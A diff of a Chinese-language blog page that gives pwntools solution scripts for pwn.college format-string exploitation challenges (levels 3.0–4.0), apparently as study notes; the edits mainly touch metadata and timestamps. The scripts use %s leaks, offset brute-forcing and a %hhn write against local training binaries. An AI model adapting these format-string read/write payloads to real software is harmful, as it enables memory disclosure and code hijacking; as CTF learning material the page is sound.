@@ -19,15 +19,15 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="pwn-college中格式化字符串的学习（上）pwn.college level3.0from pwn import *;tt &#x3D; 40a &#x3D; [0]*ttp &#x3D; process(&quot;&#x2F;challenge&#x2F;babyfmt_level3.0&quot;)p.send(f&quot;%30$s&quot;.encode().ljust(9,b&#39;a&#39;)+p64(0x404110">
+    <meta name="description" content="pwn.college level3.0from pwn import *;tt &#x3D; 40a &#x3D; [0]*ttp &#x3D; process(&quot;&#x2F;challenge&#x2F;babyfmt_level3.0&quot;)p.send(f&quot;%30$s&quot;.encode().ljust(9,b&#39;a&#39;)+p64(0x404110))p.interactive()&#39;&amp;#">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn-college中格式化字符串的学习（上）">
 <meta property="og:url" content="http://example.com/2026/04/26/pwn-college%E4%B8%AD%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%8A%EF%BC%89/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="pwn-college中格式化字符串的学习（上）pwn.college level3.0from pwn import *;tt &#x3D; 40a &#x3D; [0]*ttp &#x3D; process(&quot;&#x2F;challenge&#x2F;babyfmt_level3.0&quot;)p.send(f&quot;%30$s&quot;.encode().ljust(9,b&#39;a&#39;)+p64(0x404110">
+<meta property="og:description" content="pwn.college level3.0from pwn import *;tt &#x3D; 40a &#x3D; [0]*ttp &#x3D; process(&quot;&#x2F;challenge&#x2F;babyfmt_level3.0&quot;)p.send(f&quot;%30$s&quot;.encode().ljust(9,b&#39;a&#39;)+p64(0x404110))p.interactive()&#39;&amp;#">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2026-04-26T01:10:28.000Z">
-<meta property="article:modified_time" content="2026-04-26T01:14:16.581Z">
+<meta property="article:modified_time" content="2026-08-16T09:17:14.861Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
@@ -303,7 +303,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    Last updated on April 26, 2026 am
+                    Last updated on August 16, 2026 pm
                   
                 
               </p>
@@ -311,7 +311,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="pwn-college中格式化字符串的学习（上）"><a href="#pwn-college中格式化字符串的学习（上）" class="headerlink" title="pwn-college中格式化字符串的学习（上）"></a>pwn-college中格式化字符串的学习（上）</h1><p><a target="_blank" rel="noopener" href="https://pwn.college/software-exploitation/format-string-exploits/">pwn.college</a></p>
+                <p><a target="_blank" rel="noopener" href="https://pwn.college/software-exploitation/format-string-exploits/">pwn.college</a></p>
 <h2 id="level3-0"><a href="#level3-0" class="headerlink" title="level3.0"></a>level3.0</h2><p><code>from pwn import *;</code><br><code>tt = 40</code><br><code>a = [0]*tt</code><br><code>p = process(&quot;/challenge/babyfmt_level3.0&quot;)</code><br><code>p.send(f&quot;%30$s&quot;.encode().ljust(9,b&#39;a&#39;)+p64(0x404110))</code><br><code>p.interactive()</code><br><code>&#39;&#39;&#39;</code><br><code>for i in range(1,tt):</code><br>    <code>p = process(&quot;/challenge/babyfmt_level3.0&quot;)</code><br>    <code>p.send(f&quot;%{i}$p.&quot;.encode().ljust(9,b&#39;a&#39;) + p64(0x404110))</code><br>    <code>p.recvuntil(&quot;on your data!\n&quot;)</code><br>    <code>p.recvline()</code><br>    <code>a[i] = p.recvline()</code><br>    <code>p.kill()</code><br><code>for i in range(1,tt):</code><br>    <code>print(i,a[i])&#39;&#39;&#39;</code></p>
 <h2 id="level3-1"><a href="#level3-1" class="headerlink" title="level3.1"></a>level3.1</h2><p><code>from pwn import *;</code><br><code>tt = 100</code><br><code>a = [0]*tt</code><br><code>&#39;&#39;&#39;</code><br><code>p = process(&quot;/challenge/babyfmt_level3.1&quot;)</code><br><code>p.send(f&quot;%30$s&quot;.encode().ljust(6,b&#39;a&#39;)+p64(0x404080))</code><br><code>p.interactive()</code><br><code>&#39;&#39;&#39;</code><br><code>for i in range(0,tt):</code><br>    <code>p = process(&quot;/challenge/babyfmt_level3.1&quot;)</code><br>    <code>t = 0x4040c0+i</code><br>    <code>p.send(f&quot;%30$s.&quot;.encode().ljust(6,b&#39;a&#39;) + p64(t))</code><br>    <code>try:</code><br>        <code>p.recvuntil(&quot;on your data!\n&quot;)</code><br>    <code>except EOFError:</code><br>        <code>print(&quot;程序已经崩溃，读不到输出了&quot;)#p.recvuntil(&quot;on your data!\n&quot;)</code><br>        <code>p.kill()</code><br>        <code>continue;</code><br>    <code>p.recvline()</code><br>    <code>a[i] = p.recvline()</code><br>    <code>p.kill()</code><br><code>for i in range(1,tt):</code><br>    <code>print(i,a[i])</code><br>其中  readelf -S .&#x2F;babyfmt_level3.1 | grep .bss<br>(gdb) x&#x2F;80gx 0x404080 找到global</p>
 <h2 id="level4-0"><a href="#level4-0" class="headerlink" title="level4.0"></a>level4.0</h2><p><code>from pwn import *</code><br><code>p = process(&quot;/challenge/babyfmt_level4.0&quot;)</code><br><code>p.send(f&quot;%22$185c%23$hhn&quot;.encode().ljust(15,b&#39;a&#39;)+p64(0x404140))</code><br><code>#p.send(f&quot;%b9c%23$naaaaa.&quot;.encode()+p64(0x404140))</code><br><code>p.interactive()</code></p>
